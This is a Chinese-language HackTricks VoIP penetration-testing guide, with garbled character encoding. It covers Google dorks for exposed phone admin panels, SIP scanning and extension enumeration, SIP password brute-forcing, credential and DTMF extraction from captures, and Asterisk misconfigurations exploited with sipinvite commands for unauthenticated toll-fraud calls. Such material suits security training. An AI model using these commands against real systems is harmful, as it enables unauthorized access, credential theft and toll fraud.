# VoIPæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## VoIPåŸºæœ¬ä¿¡æ¯

è¦å¼€å§‹å­¦ä¹ VoIPçš„å·¥ä½œåŸç†ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## VoIPæšä¸¾

### ç”µè¯å·ç 

çº¢é˜Ÿå¯ä»¥é‡‡å–çš„ç¬¬ä¸€æ­¥æ˜¯ä½¿ç”¨OSINTå·¥å…·ã€Googleæœç´¢æˆ–ç½‘é¡µæŠ“å–æ¥æœç´¢å¯ç”¨çš„ç”µè¯å·ç ä»¥ä¸å…¬å¸è”ç³»ã€‚

ä¸€æ—¦ä½ æœ‰äº†ç”µè¯å·ç ï¼Œä½ å¯ä»¥ä½¿ç”¨åœ¨çº¿æœåŠ¡æ¥è¯†åˆ«è¿è¥å•†ï¼š

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

äº†è§£è¿è¥å•†æ˜¯å¦æä¾›VoIPæœåŠ¡ï¼Œä½ å¯ä»¥ç¡®å®šå…¬å¸æ˜¯å¦æ­£åœ¨ä½¿ç”¨VoIP...æ­¤å¤–ï¼Œå…¬å¸å¯èƒ½æ²¡æœ‰é›‡ç”¨VoIPæœåŠ¡ï¼Œè€Œæ˜¯ä½¿ç”¨PSTNå¡å°†è‡ªå·±çš„VoIP PBXè¿æ¥åˆ°ä¼ ç»Ÿç”µè¯ç½‘ç»œã€‚

è‡ªåŠ¨å›å¤éŸ³ä¹ç­‰äº‹ç‰©é€šå¸¸è¡¨æ˜æ­£åœ¨ä½¿ç”¨VoIPã€‚
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINTä¿¡æ¯

ä»»ä½•å…¶ä»–æœ‰åŠ©äºè¯†åˆ«æ­£åœ¨ä½¿ç”¨çš„VoIPè½¯ä»¶çš„OSINTæšä¸¾å¯¹äºçº¢é˜Ÿéƒ½æ˜¯æœ‰å¸®åŠ©çš„ã€‚

### ç½‘ç»œæšä¸¾

* **`nmap`** èƒ½å¤Ÿæ‰«æUDPæœåŠ¡ï¼Œä½†ç”±äºæ‰«æçš„UDPæœåŠ¡æ•°é‡è¾ƒå¤šï¼Œé€Ÿåº¦å¾ˆæ…¢ï¼Œå¹¶ä¸”å¯èƒ½å¯¹è¿™ç§ç±»å‹çš„æœåŠ¡ä¸å¤Ÿå‡†ç¡®ã€‚
* **`svmap`** æ¥è‡ªSIPVicious (`sudo apt install sipvicious`)ï¼šå°†åœ¨æŒ‡å®šçš„ç½‘ç»œä¸­å®šä½SIPæœåŠ¡ã€‚
* `svmap`å¾ˆå®¹æ˜“è¢«é˜»æ­¢ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†User-Agent `friendly-scanner`ï¼Œä½†æ˜¯ä½ å¯ä»¥ä¿®æ”¹`/usr/share/sipvicious/sipvicious`ä¸­çš„ä»£ç æ¥æ›´æ”¹å®ƒã€‚
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan æ˜¯ä¸€ä¸ªéå¸¸å¿«é€Ÿçš„ç”¨äºæ‰«æ UDPã€TCP æˆ– TLS ä¸Šçš„ SIP æœåŠ¡çš„æ‰«æå™¨ã€‚å®ƒä½¿ç”¨å¤šçº¿ç¨‹å¹¶ä¸”å¯ä»¥æ‰«æå¤§èŒƒå›´çš„ç½‘ç»œã€‚å®ƒå…è®¸è½»æ¾æŒ‡å®šç«¯å£èŒƒå›´ï¼ŒåŒæ—¶æ‰«æ TCP å’Œ UDPï¼Œä½¿ç”¨å…¶ä»–æ–¹æ³•ï¼ˆé»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨ OPTIONSï¼‰å¹¶æŒ‡å®šä¸åŒçš„ User-Agentï¼ˆç­‰ç­‰ï¼‰ã€‚
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**ï¼ˆå…ƒæ°”æ¡†æ¶ï¼‰ï¼š
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### é¢å¤–çš„ç½‘ç»œæšä¸¾

PBXè¿˜å¯èƒ½æš´éœ²å…¶ä»–ç½‘ç»œæœåŠ¡ï¼Œä¾‹å¦‚ï¼š

* **69/UDP (TFTP)**ï¼šå›ºä»¶æ›´æ–°
* **80 (HTTP) / 443 (HTTPS)**ï¼šé€šè¿‡Webç®¡ç†è®¾å¤‡
* **389 (LDAP)**ï¼šç”¨äºå­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æ›¿ä»£æ–¹æ³•
* **3306 (MySQL)**ï¼šMySQLæ•°æ®åº“
* **5038 (Manager)**ï¼šå…è®¸ä»å…¶ä»–å¹³å°ä½¿ç”¨Asterisk
* **5222 (XMPP)**ï¼šä½¿ç”¨Jabberå‘é€æ¶ˆæ¯
* **5432 (PostgreSQL)**ï¼šPostgreSQLæ•°æ®åº“
* ç­‰ç­‰...

### æ–¹æ³•æšä¸¾

å¯ä»¥ä½¿ç”¨[sippts](https://github.com/Pepelux/sippts)ä¸­çš„`sipenumerate.py`æ¥æŸ¥æ‰¾PBXä¸­å¯ç”¨çš„æ–¹æ³•ã€‚
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### åˆ†æœºæšä¸¾

åœ¨PBXï¼ˆç§æœ‰åˆ†æ”¯äº¤æ¢ï¼‰ç³»ç»Ÿä¸­ï¼Œåˆ†æœºæ˜¯æŒ‡ä¸ºç»„ç»‡æˆ–ä¼ä¸šä¸­çš„ä¸ªåˆ«ç”µè¯çº¿è·¯ã€è®¾å¤‡æˆ–ç”¨æˆ·åˆ†é…çš„**å”¯ä¸€å†…éƒ¨æ ‡è¯†ç¬¦**ã€‚åˆ†æœºä½¿å¾—åœ¨ç»„ç»‡å†…éƒ¨**é«˜æ•ˆåœ°è·¯ç”±å‘¼å«**æˆä¸ºå¯èƒ½ï¼Œæ— éœ€ä¸ºæ¯ä¸ªç”¨æˆ·æˆ–è®¾å¤‡åˆ†é…å•ç‹¬çš„å¤–éƒ¨ç”µè¯å·ç ã€‚

* ä½¿ç”¨SIPViciousä¸­çš„**`svwar`**ï¼ˆ`sudo apt install sipvicious`ï¼‰ï¼š`svwar`æ˜¯ä¸€ä¸ªå…è´¹çš„SIP PBXåˆ†æœºæ‰«æå·¥å…·ã€‚å®ƒçš„å·¥ä½œåŸç†ç±»ä¼¼äºä¼ ç»Ÿçš„æ‹¨å·æ‰«æå™¨ï¼Œé€šè¿‡**çŒœæµ‹ä¸€ç³»åˆ—åˆ†æœºæˆ–ç»™å®šçš„åˆ†æœºåˆ—è¡¨**æ¥è¿›è¡Œæ‰«æã€‚
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten å¯ä»¥è¯†åˆ« SIP æœåŠ¡å™¨ä¸Šçš„åˆ†æœºã€‚Sipexten å¯ä»¥æ£€æŸ¥å¤§å‹ç½‘ç»œå’Œç«¯å£èŒƒå›´ã€‚
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨metasploitæ¥æšä¸¾æ‰©å±•å/ç”¨æˆ·åï¼š
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** æ˜¯ä¸€ç§ç”¨äº Inter Asterisk Exchange åè®®çš„**ç”¨æˆ·åæš´åŠ›ç ´è§£æšä¸¾å™¨**ã€‚enumIAX å¯ä»¥ä»¥ä¸¤ç§ä¸åŒçš„æ¨¡å¼è¿è¡Œï¼›é¡ºåºç”¨æˆ·åçŒœæµ‹æˆ–å­—å…¸æ”»å‡»ã€‚
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIPæ”»å‡»

### å¯†ç æš´åŠ›ç ´è§£

åœ¨å‘ç°äº†**PBX**å’Œä¸€äº›**åˆ†æœº/ç”¨æˆ·å**ä¹‹åï¼Œçº¢é˜Ÿå¯ä»¥å°è¯•ä½¿ç”¨å¸¸è§å¯†ç å­—å…¸é€šè¿‡**`REGISTER`æ–¹æ³•**å¯¹åˆ†æœºè¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»¥è¿›è¡Œèº«ä»½éªŒè¯çš„å¯†ç æš´åŠ›ç ´è§£ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œ**ç”¨æˆ·å**å¯èƒ½ä¸åˆ†æœºç›¸åŒï¼Œä½†è¿™ç§åšæ³•å¯èƒ½å› PBXç³»ç»Ÿã€å…¶é…ç½®å’Œç»„ç»‡çš„åå¥½è€Œæœ‰æ‰€ä¸åŒ...

å¦‚æœç”¨æˆ·åä¸åˆ†æœºä¸åŒï¼Œæ‚¨éœ€è¦**æ‰¾å‡ºç”¨æˆ·åä»¥è¿›è¡Œæš´åŠ›ç ´è§£**ã€‚
{% endhint %}

* **`svcrack`**æ¥è‡ªSIPViciousï¼ˆ`sudo apt install sipvicious`ï¼‰ï¼šSVCrackå…è®¸æ‚¨ç ´è§£PBXä¸Šç‰¹å®šç”¨æˆ·å/åˆ†æœºçš„å¯†ç ã€‚
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack æ˜¯ä¸€ä¸ªç”¨äºç ´è§£ SIP åè®®ä¸­çš„æ‘˜è¦è®¤è¯çš„å·¥å…·ã€‚

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIPå—…æ¢

å¦‚æœä½ åœ¨ä¸€ä¸ª**å¼€æ”¾çš„Wifiç½‘ç»œ**ä¸­å‘ç°VoIPè®¾å¤‡ï¼Œä½ å¯ä»¥**å—…æ¢åˆ°æ‰€æœ‰çš„ä¿¡æ¯**ã€‚æ­¤å¤–ï¼Œå¦‚æœä½ åœ¨ä¸€ä¸ªæ›´å°é—­çš„ç½‘ç»œä¸­ï¼ˆé€šè¿‡ä»¥å¤ªç½‘æˆ–å—ä¿æŠ¤çš„Wifiè¿æ¥ï¼‰ï¼Œä½ å¯ä»¥æ‰§è¡Œ**ä¸­é—´äººæ”»å‡»ï¼Œå¦‚**[**ARPæ¬ºéª—**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)åœ¨**PBXå’Œç½‘å…³**ä¹‹é—´ï¼Œä»¥ä¾¿å—…æ¢ä¿¡æ¯ã€‚

åœ¨ç½‘ç»œä¿¡æ¯ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ç”¨äºç®¡ç†è®¾å¤‡çš„**Webå‡­æ®**ï¼Œç”¨æˆ·**åˆ†æœºå·ç **ï¼Œ**ç”¨æˆ·å**ï¼Œ**IP**åœ°å€ï¼Œç”šè‡³**å“ˆå¸Œå¯†ç **å’Œ**RTPæ•°æ®åŒ…**ï¼Œä½ å¯ä»¥é‡ç°å®ƒä»¬ä»¥**å¬åˆ°å¯¹è¯**ï¼Œç­‰ç­‰ã€‚

è¦è·å–è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥ä½¿ç”¨è¯¸å¦‚Wiresharkã€tcpdumpç­‰å·¥å…·ï¼Œä½†ä¸€ä¸ª**ä¸“é—¨ç”¨äºå—…æ¢VoIPå¯¹è¯çš„å·¥å…·æ˜¯**[**ucsniff**](https://github.com/Seabreg/ucsniff)ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**SIPé€šä¿¡ä¸­ä½¿ç”¨äº†TLS**ï¼Œä½ å°†æ— æ³•æ¸…æ¥šåœ°çœ‹åˆ°SIPé€šä¿¡ã€‚\
å¦‚æœä½¿ç”¨äº†**SRTP**å’Œ**ZRTP**ï¼Œ**RTPæ•°æ®åŒ…å°†ä¸ä¼šä»¥æ˜æ–‡å½¢å¼**æ˜¾ç¤ºã€‚
{% endhint %}

#### SIPå‡­æ®

[æŸ¥çœ‹æ­¤ç¤ºä¾‹ä»¥æ›´å¥½åœ°äº†è§£**SIP REGISTERé€šä¿¡**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example)ä»¥äº†è§£**å‡­æ®æ˜¯å¦‚ä½•å‘é€çš„**ã€‚

* **`sipdump`**å’Œ**`sipcrack`**ï¼Œæ˜¯**sipcrack**çš„ä¸€éƒ¨åˆ†ï¼ˆ`apt-get install sipcrack`ï¼‰ï¼šè¿™äº›å·¥å…·å¯ä»¥ä»**pcap**ä¸­**æå–**SIPåè®®ä¸­çš„**æ‘˜è¦è®¤è¯**ï¼Œå¹¶å¯¹å…¶è¿›è¡Œ**æš´åŠ›ç ´è§£**ã€‚
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** ä»PCAPæ–‡ä»¶ä¸­æå–SIPåè®®çš„æ•°æ®ã€‚
* **SipDump** ä»PCAPæ–‡ä»¶ä¸­æå–SIPæ‘˜è¦è®¤è¯ã€‚
* **SIP Digest Crack** æ˜¯ä¸€ä¸ªç”¨äºç ´è§£SIPåè®®ä¸­æ‘˜è¦è®¤è¯çš„å·¥å…·ã€‚
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMFä»£ç 

ä¸ä»…å¯ä»¥åœ¨ç½‘ç»œæµé‡ä¸­æ‰¾åˆ°SIPå‡­æ®ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°ç”¨äºè®¿é—®è¯­éŸ³é‚®ä»¶çš„DTMFä»£ç ã€‚\
å¯ä»¥é€šè¿‡**INFO SIPæ¶ˆæ¯**ã€**éŸ³é¢‘**æˆ–**RTPæ•°æ®åŒ…**å‘é€è¿™äº›ä»£ç ã€‚å¦‚æœä»£ç åœ¨RTPæ•°æ®åŒ…ä¸­ï¼Œå¯ä»¥å‰ªåˆ‡å¯¹è¯çš„é‚£éƒ¨åˆ†å¹¶ä½¿ç”¨multimoå·¥å…·æå–å®ƒä»¬ï¼š
```bash
multimon -a DTMF -t wac pin.wav
```
### å…è´¹é€šè¯/ Asterisks è¿æ¥é…ç½®é”™è¯¯

åœ¨ Asterisk ä¸­ï¼Œå¯ä»¥å…è®¸æ¥è‡ªç‰¹å®š IP åœ°å€æˆ–ä»»æ„ IP åœ°å€çš„è¿æ¥ï¼š
```
host=10.10.10.10
host=dynamic
```
å¦‚æœæŒ‡å®šäº†IPåœ°å€ï¼Œä¸»æœºå°±ä¸éœ€è¦å®šæœŸå‘é€REGISTERè¯·æ±‚ï¼ˆåœ¨REGISTERæ•°æ®åŒ…ä¸­å‘é€çš„ç”Ÿå­˜æ—¶é—´é€šå¸¸ä¸º30åˆ†é’Ÿï¼Œè¿™æ„å‘³ç€åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œç”µè¯å°†éœ€è¦æ¯30åˆ†é’Ÿè¿›è¡Œæ³¨å†Œï¼‰ã€‚ä½†æ˜¯ï¼Œå®ƒéœ€è¦æ‰“å¼€å…è®¸æ¥è‡ªVoIPæœåŠ¡å™¨çš„è¿æ¥çš„ç«¯å£ï¼Œä»¥æ¥å¬ç”µè¯ã€‚

è¦å®šä¹‰ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ï¼š

* **`type=user`**ï¼šç”¨æˆ·åªèƒ½ä½œä¸ºç”¨æˆ·æ¥æ”¶å‘¼å«ã€‚
* **`type=friend`**ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰ä½“è¿›è¡Œå‘¼å«ï¼Œå¹¶ä½œä¸ºç”¨æˆ·æ¥æ”¶å‘¼å«ï¼ˆä¸æ‰©å±•ä¸€èµ·ä½¿ç”¨ï¼‰ã€‚
* **`type=peer`**ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰ä½“å‘é€å’Œæ¥æ”¶å‘¼å«ï¼ˆSIP-trunkï¼‰ã€‚

è¿˜å¯ä»¥é€šè¿‡ä¸å®‰å…¨çš„å˜é‡å»ºç«‹ä¿¡ä»»å…³ç³»ï¼š

* **`insecure=port`**ï¼šå…è®¸é€šè¿‡IPéªŒè¯å¯¹ç­‰è¿æ¥ã€‚
* **`insecure=invite`**ï¼šINVITEæ¶ˆæ¯ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
* **`insecure=port,invite`**ï¼šä¸¤è€…éƒ½éœ€è¦ã€‚

{% hint style="warning" %}
å½“ä½¿ç”¨**`type=friend`**æ—¶ï¼Œ**host**å˜é‡çš„**å€¼å°†ä¸ä¼šè¢«ä½¿ç”¨**ï¼Œå› æ­¤ï¼Œå¦‚æœç®¡ç†å‘˜ä½¿ç”¨è¯¥å€¼**é”™è¯¯é…ç½®SIP-trunk**ï¼Œ**ä»»ä½•äººéƒ½å¯ä»¥è¿æ¥åˆ°å®ƒ**ã€‚

ä¾‹å¦‚ï¼Œä»¥ä¸‹é…ç½®å°†å­˜åœ¨æ¼æ´ï¼š\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### å…è´¹é€šè¯/ Asterisksä¸Šä¸‹æ–‡é…ç½®é”™è¯¯

åœ¨Asteriskä¸­ï¼Œ**ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰**æ˜¯æ‹¨å·è®¡åˆ’ä¸­çš„ä¸€ä¸ªå‘½åå®¹å™¨æˆ–éƒ¨åˆ†ï¼Œç”¨äº**å°†ç›¸å…³çš„åˆ†æœºã€åŠ¨ä½œå’Œè§„åˆ™åˆ†ç»„åœ¨ä¸€èµ·**ã€‚æ‹¨å·è®¡åˆ’æ˜¯Asteriskç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œå®ƒå®šä¹‰äº†**å¦‚ä½•å¤„ç†å’Œè·¯ç”±å‘¼å…¥å’Œå‘¼å‡ºçš„ç”µè¯**ã€‚ä¸Šä¸‹æ–‡ç”¨äºç»„ç»‡æ‹¨å·è®¡åˆ’ï¼Œç®¡ç†è®¿é—®æ§åˆ¶ï¼Œå¹¶åœ¨ç³»ç»Ÿçš„ä¸åŒéƒ¨åˆ†ä¹‹é—´æä¾›åˆ†éš”ã€‚

æ¯ä¸ªä¸Šä¸‹æ–‡åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œé€šå¸¸åœ¨**`extensions.conf`**æ–‡ä»¶ä¸­ã€‚ä¸Šä¸‹æ–‡ç”±æ–¹æ‹¬å·è¡¨ç¤ºï¼Œä¸Šä¸‹æ–‡åç§°ä½äºæ–¹æ‹¬å·å†…ã€‚ä¾‹å¦‚ï¼š
```bash
csharpCopy code[my_context]
```
åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ‚¨å®šä¹‰åˆ†æœºï¼ˆæ‹¨å·å·ç çš„æ¨¡å¼ï¼‰å¹¶å°†å…¶ä¸ä¸€ç³»åˆ—æ“ä½œæˆ–åº”ç”¨ç¨‹åºå…³è”èµ·æ¥ã€‚è¿™äº›æ“ä½œç¡®å®šå‘¼å«çš„å¤„ç†æ–¹å¼ã€‚ä¾‹å¦‚ï¼š
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
è¿™ä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä¸€ä¸ªåä¸º"my\_context"çš„ç®€å•ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªåˆ†æœº"100"ã€‚å½“æœ‰äººæ‹¨æ‰“100æ—¶ï¼Œç”µè¯å°†è¢«æ¥å¬ï¼Œæ’­æ”¾æ¬¢è¿æ¶ˆæ¯ï¼Œç„¶åç”µè¯å°†è¢«ç»ˆæ­¢ã€‚

è¿™æ˜¯**å¦ä¸€ä¸ªä¸Šä¸‹æ–‡**ï¼Œå…è®¸**æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç **ï¼š
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
å¦‚æœç®¡ç†å‘˜å°†**é»˜è®¤ä¸Šä¸‹æ–‡**å®šä¹‰ä¸ºï¼š
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨æœåŠ¡å™¨æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç ï¼ˆæœåŠ¡å™¨ç®¡ç†å‘˜å°†ä¸ºé€šè¯ä»˜è´¹ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ**`sip.conf`** æ–‡ä»¶åŒ…å« **`allowguest=true`**ï¼Œå› æ­¤**ä»»ä½•**æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…éƒ½å¯ä»¥æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç ã€‚
{% endhint %}

*   **`sipinvite.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** Sipinvite æ£€æŸ¥ä¸€ä¸ª PBX æœåŠ¡å™¨æ˜¯å¦å…è®¸æˆ‘ä»¬åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è¿›è¡Œå‘¼å«ã€‚å¦‚æœ SIP æœåŠ¡å™¨é…ç½®ä¸æ­£ç¡®ï¼Œå®ƒå°†å…è®¸æˆ‘ä»¬æ‹¨æ‰“å¤–éƒ¨å·ç ã€‚å®ƒè¿˜å¯ä»¥å…è®¸æˆ‘ä»¬å°†é€šè¯è½¬æ¥åˆ°ç¬¬äºŒä¸ªå¤–éƒ¨å·ç ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„ Asterisk æœåŠ¡å™¨å…·æœ‰é”™è¯¯çš„ä¸Šä¸‹æ–‡é…ç½®ï¼Œæ‚¨å¯ä»¥æ¥å—æœªç»æˆæƒçš„ INVITE è¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“ä»»ä½•ç”¨æˆ·/å¯†ç çš„æƒ…å†µä¸‹è¿›è¡Œå‘¼å«ã€‚

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### å…è´¹é€šè¯ / é…ç½®é”™è¯¯çš„IVRS

IVRSä»£è¡¨**äº¤äº’å¼è¯­éŸ³åº”ç­”ç³»ç»Ÿ**ï¼Œæ˜¯ä¸€ç§ç”µè¯æŠ€æœ¯ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡è¯­éŸ³æˆ–æŒ‰é”®è¾“å…¥ä¸è®¡ç®—æœºåŒ–ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚IVRSç”¨äºæ„å»º**è‡ªåŠ¨å‘¼å«å¤„ç†**ç³»ç»Ÿï¼Œæä¾›ä¸€ç³»åˆ—åŠŸèƒ½ï¼Œå¦‚æä¾›ä¿¡æ¯ã€è·¯ç”±å‘¼å«å’Œæ•è·ç”¨æˆ·è¾“å…¥ã€‚

VoIPç³»ç»Ÿä¸­çš„IVRSé€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š

1. **è¯­éŸ³æç¤º**ï¼šé¢„å…ˆå½•åˆ¶çš„éŸ³é¢‘æ¶ˆæ¯ï¼Œå¼•å¯¼ç”¨æˆ·é€šè¿‡IVRèœå•é€‰é¡¹å’ŒæŒ‡ç¤ºã€‚
2. **DTMF**ï¼ˆåŒéŸ³å¤šé¢‘ï¼‰ä¿¡å·ï¼šé€šè¿‡åœ¨ç”µè¯ä¸ŠæŒ‰é”®ç”Ÿæˆçš„æŒ‰é”®è¾“å…¥ï¼Œç”¨äºæµè§ˆIVRèœå•å¹¶æä¾›è¾“å…¥ã€‚
3. **å‘¼å«è·¯ç”±**ï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥å°†å‘¼å«å®šå‘åˆ°é€‚å½“çš„ç›®æ ‡ï¼Œå¦‚ç‰¹å®šéƒ¨é—¨ã€ä»£ç†æˆ–åˆ†æœºã€‚
4. **ç”¨æˆ·è¾“å…¥æ•è·**ï¼šä»å‘¼å«è€…é‚£é‡Œæ”¶é›†ä¿¡æ¯ï¼Œå¦‚å¸å·å·ç ã€æ¡ˆä¾‹IDæˆ–ä»»ä½•å…¶ä»–ç›¸å…³æ•°æ®ã€‚
